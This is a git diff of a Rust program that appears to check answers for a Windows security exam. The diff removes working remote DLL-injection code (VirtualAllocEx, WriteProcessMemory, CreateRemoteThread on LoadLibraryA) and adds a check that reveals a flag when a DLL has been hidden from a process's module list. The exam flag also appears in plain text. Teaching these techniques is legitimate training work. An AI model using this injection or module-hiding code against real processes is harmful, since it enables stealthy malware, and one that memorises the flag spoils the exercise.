@@ -25,12 +25,12 @@ use ntapi::ntpsapi::*;
 use ntapi::ntmmapi::*;
 use crate::peparser::Peparser64;
 use crate::processmanager::enumeration::{get_process_info_by_name, get_processes, get_processes_from_createtoolhelp32snapshot, processchecker, processcheckerwithargs, readunicodestringfrommemory};
-use crate::utils::ReadStringFromMemory;
+use crate::utils::{getclipboard, setclipboard, ReadStringFromMemory};
 use winapi::um::winnt::*;
 use winapi::shared::minwindef::*;
 use winapi::um::libloaderapi::*;
 use ntapi::ntpebteb::*;
-use winapi::shared::ntdef::{NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES};
+use winapi::shared::ntdef::{NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES};
 use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::winuser::*;
@@ -67,6 +67,7 @@ use_litcrypt!();
 use base64::*;
 use ntapi::ntapi_base::{CLIENT_ID, PCLIENT_ID};
 use ntapi::ntobapi::NtClose;
+use winapi::um::ktmw32::*;
 use winapi::um::namedpipeapi::{*, CreatePipe};
 
 #[no_mangle]
@@ -116,10 +117,6 @@ pub fn createpipe2(){
 
 
 fn main() {
-
-
-
-
     /*let args = std::env::args().collect::<Vec<String>>();
 
     // args[1] = filenametoexecute.exe
@@ -205,49 +202,38 @@ fn main() {
     // arg[1] = filename to execute
     // arg[2] = argument
 
+    let p = get_processes();
+    let mut isdllpresent = false;
+    let mut isprocesspresent = false;
 
-    // ReadFile - md5hash - 9793e97d7800c4d457a5ddacf2871fba
+    for i in 0..p.len(){
 
-    // solution17.exe
-    let p = processmanager::enumeration::get_processes();
-    for i in 0..p.len() {
-        if p[i].get_process_name().to_lowercase() == "runme17.exe" {
+        if p[i].get_process_name().to_lowercase()=="examprocess4.exe"{
 
-
-            // Loading our dll in runme17.exe
-
-            let prochandle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, p[i].get_process_id()) };
-
-            if !prochandle.is_null() {
-                let mut dllpath = "C:\\Users\\flash\\Desktop\\myserver\\myserver\\main.py\\..\\bin\\custommadedll.dll".bytes().collect::<Vec<u8>>();
-                dllpath.push(0);
-
-                let remotebase = unsafe {
-                    VirtualAllocEx(prochandle, std::ptr::null_mut(),
-                                   dllpath.len() as usize, MEM_COMMIT, PAGE_READWRITE)
-                };
-
-                let mut byteswritten = 0;
-                unsafe {
-                    WriteProcessMemory(prochandle, remotebase,
-                                       dllpath.as_ptr() as *const c_void,
-                                       dllpath.len() as usize, &mut byteswritten)
-                };
+            isprocesspresent = true;
+            let dlls = p[i].get_loaded_dlls_basedllname().unwrap();
 
 
-                let modhandle = unsafe { GetModuleHandleA("kernel32.dll\0".bytes().collect::<Vec<u8>>().as_ptr() as *const i8) };
-                let addr = unsafe { GetProcAddress(modhandle, "LoadLibraryA\0".bytes().collect::<Vec<u8>>().as_ptr() as *const i8) };
+            for (dllname,dllbase) in dlls.iter(){
 
+                if dllname.to_lowercase()=="test.dll"{
+                    isdllpresent=true;
+                    break;
+                }
 
-                let mut threadid = 0;
-                let threadhandle = unsafe {
-                    CreateRemoteThread(prochandle,
-                                       std::ptr::null_mut(), 0,
-                                       std::mem::transmute(addr),
-                                       std::mem::transmute(remotebase),
-                                       0, &mut threadid)
-                };
             }
+
+
+
         }
+
     }
+
+    if isdllpresent==false && isprocesspresent==true{
+        println!("{}",lc!("EXAM-FLAG4{FANTASTICALLY_HID_THE_IN_LOAD_ORDER_MODULELIST}"));
+        std::process::exit(0);
+    }
+
+    println!("Sorry, Try Again");
+
 }
